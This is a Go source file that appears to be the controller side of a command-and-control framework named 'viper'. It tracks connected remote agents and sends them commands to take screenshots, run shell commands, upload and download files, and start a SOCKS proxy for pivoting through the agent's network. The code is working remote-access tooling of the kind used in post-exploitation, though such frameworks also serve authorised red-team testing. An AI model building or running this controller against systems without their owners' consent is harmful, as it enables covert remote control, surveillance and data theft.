package agents

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"github.com/hashicorp/yamux"
	"google.golang.org/protobuf/proto"

	pb "viper/protos/cmds"
)

type Agent struct {
	Id                 int64
	alive              bool
	session            *yamux.Session
	cmdStream          net.Conn
	ConnectTime        time.Time
	socksProxyListener net.Listener
	lock               sync.Mutex
}

const (
	ERR_AGENT_DISCONNECTED = "[%d] agent has disconnected"
	ERR_AGENT_NOT_FOUND    = "agent not found"
)

var (
	Agents = make(map[int64]*Agent)
)

func GetAgent(id int64) (*Agent, error) {
	agent := Agents[id]
	if agent == nil {
		return nil, fmt.Errorf(ERR_AGENT_NOT_FOUND)
	}
	if !agent.alive {
		return nil, fmt.Errorf(ERR_AGENT_DISCONNECTED, id)
	}
	return agent, nil
}

func InitAgent(conn net.Conn) {
	log.Printf("received connection @ %v", conn.RemoteAddr())
	session, err := yamux.Server(conn, nil)
	if err != nil {
		log.Printf("failed to create a multiplexed server: %v", err)
		return
	}
	cmdStream, err := session.Accept()
	if err != nil {
		log.Printf("failed to accept a multiplex stream: %v", err)
	}
	agentId := int64(len(Agents))
	agent := &Agent{session: session, cmdStream: cmdStream, alive: true, Id: agentId, ConnectTime: time.Now()}
	validAgent := agent.IsAlive()
	if !validAgent {
		log.Printf("connection is not an agent")
		conn.Close()
		return
	}
	log.Printf("[%d] initializing agent", agentId)
	Agents[agentId] = agent
}

func (agent *Agent) IsAlive() bool {
	if !agent.alive {
		return false
	}
	_, err := agent.RunEchoCommand(&pb.EchoCommandRequest{Data: "ping"})
	return err == nil
}

func (agent *Agent) Screenshot(req *pb.ScreenshotRequest) (*pb.ScreenshotResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	cmdReq := &pb.CommandRequest{Type: pb.SCREENSHOT_CMD_TYPE, Req: &pb.CommandRequest_ScreenshotRequest{ScreenshotRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.ScreenshotResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, fmt.Errorf(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) RunEchoCommand(req *pb.EchoCommandRequest) (*pb.EchoCommandResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	cmdReq := &pb.CommandRequest{Type: pb.ECHO_CMD_TYPE, Req: &pb.CommandRequest_EchoCommandRequest{EchoCommandRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.EchoCommandResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func (agent *Agent) RunShellCommand(req *pb.ShellCommandRequest) (*pb.ShellCommandResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	cmdReq := &pb.CommandRequest{Type: pb.SHELL_CMD_TYPE, Req: &pb.CommandRequest_ShellCommandRequest{ShellCommandRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.ShellCommandResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, fmt.Errorf(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) DownloadFile(req *pb.DownloadFileRequest) (*pb.DownloadFileResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	cmdReq := &pb.CommandRequest{Type: pb.DOWNLOAD_FILE_CMD_TYPE, Req: &pb.CommandRequest_DownloadFileRequest{DownloadFileRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.DownloadFileResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, fmt.Errorf(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) UploadFile(req *pb.UploadFileRequest) (*pb.UploadFileResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	cmdReq := &pb.CommandRequest{Type: pb.UPLOAD_FILE_CMD_TYPE, Req: &pb.CommandRequest_UploadFileRequest{UploadFileRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.UploadFileResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, fmt.Errorf(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) StartSocksServer(req *pb.StartSocksServerRequest) (*pb.StartSocksServerResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	if agent.socksProxyListener != nil {
		return nil, fmt.Errorf("the SOCKS server is already running at %v", agent.socksProxyListener.Addr())
	}
	cmdReq := &pb.CommandRequest{Type: pb.START_SOCKS_CMD_TYPE, Req: &pb.CommandRequest_StartSocksServerRequest{StartSocksServerRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.StartSocksServerResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, fmt.Errorf(resp.Err)
	}
	log.Printf("[%d] connected to the SOCKS server", agent.Id)
	socksProxyListener, err := net.Listen("tcp", "127.0.0.1:")
	if err != nil {
		return nil, err
	}
	agent.socksProxyListener = socksProxyListener
	resp.Addr = socksProxyListener.Addr().String()
	log.Printf("[%d] SOCKS proxy server @ %s", agent.Id, resp.Addr)
	go func() {
		for {
			agentConn, err := agent.session.Open()
			if err != nil {
				log.Printf("failed to open a SOCKS session")
				return
			}
			controllerConn, err := socksProxyListener.Accept()
			if err != nil {
				log.Printf("[%d] stopped accepting new SOCKS proxy connection", agent.Id)
				return
			}
			go proxyConns(controllerConn, agentConn)
			go proxyConns(agentConn, controllerConn)
		}
	}()
	return resp, nil
}

func (agent *Agent) StopSocksServer(req *pb.StopSocksServerRequest) (*pb.StopSocksServerResponse, error) {
	agent.lock.Lock()
	defer agent.lock.Unlock()
	if agent.socksProxyListener == nil {
		return nil, fmt.Errorf("the SOCKS server is not running")
	}
	cmdReq := &pb.CommandRequest{Type: pb.STOP_SOCKS_CMD_TYPE, Req: &pb.CommandRequest_StopSocksServerRequest{StopSocksServerRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.StopSocksServerResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	err = agent.socksProxyListener.Close()
	if err != nil {
		return nil, fmt.Errorf("failed to close the SOCKS proxy server: %v", err)
	}
	agent.socksProxyListener = nil
	return resp, nil
}

func proxyConns(conn1, conn2 net.Conn) {
	_, err := io.Copy(conn1, conn2)
	if err != nil {
		log.Printf("failed to proxy connections: %v", err)
		return
	}
	conn1.Close()
	conn2.Close()
}

func (agent *Agent) read(resp proto.Message) error {
	var respSize int64
	err := binary.Read(agent.cmdStream, binary.LittleEndian, &respSize)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	respBuffer := make([]byte, respSize)
	_, err = io.ReadFull(agent.cmdStream, respBuffer)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	err = proto.Unmarshal(respBuffer, resp)
	if err != nil {
		return err
	}
	return nil
}

func (agent *Agent) write(cmdReq *pb.CommandRequest) error {
	cmdBuffer, err := proto.Marshal(cmdReq)
	if err != nil {
		return err
	}
	cmdBufferLen := int64(len(cmdBuffer))
	err = binary.Write(agent.cmdStream, binary.LittleEndian, &cmdBufferLen)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	_, err = agent.cmdStream.Write(cmdBuffer)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	return nil
}

func (agent *Agent) Close() {
	if !agent.alive {
		log.Printf("[%d] agent already closed", agent.Id)
		return
	}
	log.Printf("[%d] agent has disconnected", agent.Id)
	agent.cmdStream.Close()
	agent.alive = false
}
